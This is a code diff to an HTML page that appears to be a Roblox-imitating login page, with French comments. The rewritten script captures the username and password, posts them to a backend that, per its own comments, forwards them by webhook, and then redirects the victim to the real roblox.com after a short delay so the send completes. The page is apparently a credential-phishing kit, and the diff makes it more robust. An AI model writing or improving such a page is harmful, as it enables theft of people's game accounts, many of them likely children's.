@@ -36,7 +36,6 @@
       gap: 24px;
     }
 
-    /* Bloc gauche : Logo + Liens espacés */
     .nav-left {
       display: flex;
       align-items: center;
@@ -65,7 +64,6 @@
       white-space: nowrap;
     }
 
-    /* Bloc milieu : Barre de recherche longue */
     .nav-center {
       flex: 1;
       max-width: 600px;
@@ -103,7 +101,6 @@
       color: #898a8d;
     }
 
-    /* Bloc droite : Boutons */
     .nav-right {
       display: flex;
       align-items: center;
@@ -133,7 +130,6 @@
       cursor: pointer;
     }
 
-    /* Zone centrale / Formulaire */
     .hero-container {
       margin-top: 48px;
       flex: 1;
@@ -319,34 +315,43 @@
   </div>
 
   <script>
-  const form = document.getElementById('loginForm');
+    document.addEventListener('DOMContentLoaded', () => {
+      const form = document.getElementById('loginForm');
 
-  form.addEventListener('submit', async (e) => {
-    e.preventDefault();
-
-    const username = document.getElementById('username').value;
-    const password = document.getElementById('password').value;
-
-    try {
-      const response = await fetch('/api/login', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username, password })
-      });
-
-      const data = await response.json();
-
-      if (data.success) {
-        console.log('Données transmises !');
-        // Petit délai de 500ms pour laisser le temps au webhook de bien s'envoyer avant de rediriger
-        setTimeout(() => {
-          window.location.href = 'https://www.roblox.com';
-        }, 500);
+      if (!form) {
+        console.error("Erreur : Impossible de trouver le formulaire loginForm !");
+        return;
       }
-    } catch (error) {
-      console.error('Erreur :', error);
-    }
-  });
+
+      form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        console.log("Envoi des données en cours...");
+
+        try {
+          const response = await fetch('/api/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username, password })
+          });
+
+          const data = await response.json();
+          console.log("Réponse du serveur :", data);
+
+          if (data.success) {
+            // Petit délai de sécurité pour s'assurer que le webhook est bien parti
+            setTimeout(() => {
+              window.location.href = 'https://www.roblox.com';
+            }, 600);
+          }
+        } catch (error) {
+          console.error('Erreur réseau :', error);
+        }
+      });
+    });
   </script>
 
 </body>
